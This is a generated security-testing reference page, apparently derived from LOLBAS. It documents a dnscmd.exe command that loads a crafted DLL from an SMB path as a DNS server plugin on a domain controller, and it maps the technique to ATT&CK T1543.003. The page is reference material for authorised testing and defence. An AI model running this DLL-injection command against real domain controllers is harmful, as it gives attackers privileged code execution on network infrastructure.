---
parsed_by: focuslocust
source: commands
type: generated
---
# Dnscmd Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Dnscmd.exe

Tool page: [Dnscmd.exe](../../tools/windows/dnscmd.exe.md)

### Remotely inject dll to dns server

```text
dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
```

Description:

Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.

Related ATT&CK:

- [T1543.003](../../attack/techniques/T1543.003-windows-service.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Dnscmd.yml` |
| Evidence | Command preserved from source parser. |
